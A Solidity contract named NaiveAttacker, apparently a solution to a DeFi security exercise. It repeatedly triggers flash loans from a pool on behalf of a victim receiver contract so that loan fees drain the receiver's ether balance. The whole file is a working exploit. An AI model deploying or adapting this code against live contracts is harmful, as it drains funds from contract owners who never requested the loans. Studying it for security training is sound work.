// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract NaiveAttacker {
    IPool pool;

    constructor(address _poolAddress) {
        pool = IPool(_poolAddress);
    }

    function attack(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external {
        uint256 receiverBalance = address(_receiver).balance;
        receiverBalance = receiverBalance / 1e18;
        for (uint i; i < receiverBalance; i++) {
            pool.flashLoan(_receiver, _token, _amount, _data);
        }
    }
}
